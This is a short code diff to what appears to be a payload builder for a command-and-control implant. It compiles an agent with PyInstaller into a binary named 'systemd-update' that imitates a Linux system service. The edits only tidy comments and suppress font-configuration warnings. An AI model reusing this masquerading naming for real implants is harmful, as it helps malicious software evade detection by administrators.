@@ -344,7 +344,7 @@ class Igider(PayloadType):
                 f.write(code)
 
             # Generate and write spec file
-            spec_content = self._create_pyinstaller_spec("linux")  # or target_os parameter
+            spec_content = self._create_pyinstaller_spec("linux")
             spec_path = os.path.join(temp_dir, "systemd-update.spec")
             with open(spec_path, "w") as f:
                 f.write(spec_content)
@@ -352,10 +352,14 @@ class Igider(PayloadType):
             exe_name = "systemd-update"
             exe_path = os.path.join(temp_dir, "dist", exe_name)
 
-            # Build using spec file instead of command line arguments
+            # Set FONTCONFIG_PATH to suppress warnings
+            os.environ["FONTCONFIG_PATH"] = os.path.join(temp_dir, "empty_fontconfig")
+            os.makedirs(os.environ["FONTCONFIG_PATH"], exist_ok=True)
+
+            # Build using spec file
             cmd = [
                 sys.executable, "-m", "PyInstaller",
-                "--clean",  # Clean PyInstaller cache
+                "--clean",
                 spec_path
             ]
 
